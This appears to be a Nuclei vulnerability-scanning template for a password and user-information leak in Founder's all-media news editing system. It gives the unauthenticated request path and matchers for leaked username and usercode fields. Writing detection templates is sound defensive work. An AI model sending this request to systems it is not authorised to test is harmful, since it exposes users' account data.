id: founder-newsedit-password-leak
info:
  name: 方正全媒体采编系统密码泄露漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: information-disclosure
  description: |
    方正全媒体采编系统存在信息泄露漏洞，通过特定路径可以获取敏感的用户信息。
http:
  - method: GET
    path:
      - "{{BaseURL}}/newsedit/assess/syn.do?type=org"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<?xml"
          - "</username>"
          - "</usercode>"
        part: body
